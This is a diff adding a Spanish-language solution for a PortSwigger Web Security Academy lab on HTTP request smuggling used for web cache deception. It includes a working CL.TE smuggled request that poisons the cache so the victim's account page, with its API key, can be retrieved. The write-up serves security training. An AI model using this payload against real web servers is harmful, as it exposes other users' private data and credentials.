@@ -869,6 +869,28 @@ Host: LABID.web-security-academy.net
 
 4. Repetir la request del paso 3 para confirmar que se envenenó la cache y siempre se responde con la redirección al exploit server.
 
+### [Exploiting HTTP request smuggling to perform web cache deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)
+
+#### Solución:
+
+1. Enviar la siguiente request:
+
+```
+POST / HTTP/1.1
+Host: ac5a1f211f44e31180d4a4c4000400fd.web-security-academy.net
+Content-Length: 39
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+foo: bar
+```
+
+2. Ir al inicio del sitio web (LABID.web-security-academy.net/)
+3. Buscar entre las request realizadas las palabras "API Key" (se puede buscar a la derecha abajo de la response y recorrer todas las request o desde el menú Burp->Search si se tiene la versión Pro)
+4. Si se encuentra, enviar la API Key de la víctima como solución. Sino, repetir los pasos 1 a 3 (puede llevar muchas repeticiones del mismo proceso hasta que aparezca).
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
